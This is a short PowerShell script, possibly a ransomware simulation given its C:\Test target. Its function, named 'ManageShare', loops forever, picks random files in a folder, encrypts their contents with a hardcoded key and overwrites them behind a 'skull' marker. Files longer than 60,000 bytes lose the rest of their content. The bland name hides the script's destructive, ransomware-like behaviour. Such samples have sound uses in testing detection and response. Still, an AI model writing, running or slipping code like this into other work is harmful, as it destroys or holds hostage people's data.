function ManageShare {
	$Share = "C:\Test";
	$Sleep = 10;
    $key = (48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102);
    $semaphore = "skull"
	While($true)
	{
		$files = Get-ChildItem -Path $Share -Recurse;
		if ($files.length -gt 0) {
            $sample = $files | Get-Random -Count 1;
            $plain = [System.Text.Encoding]::ASCII.GetString((Get-Content -Encoding byte -TotalCount 60000 "${Share}\${sample}"));
            if ($plain.Substring(0,$semaphore.length) -ne $semaphore) {
                $encrypt = ConvertFrom-SecureString -SecureString (ConvertTo-SecureString $plain -AsPlainText -Force) -Key $key
                Set-Content -Path "${Share}\${sample}" -value "${semaphore}${encrypt}";
			    Write-Host "${Share}\${sample}";
            }
		}
		Start-Sleep $Sleep;
	}
}
ManageShare
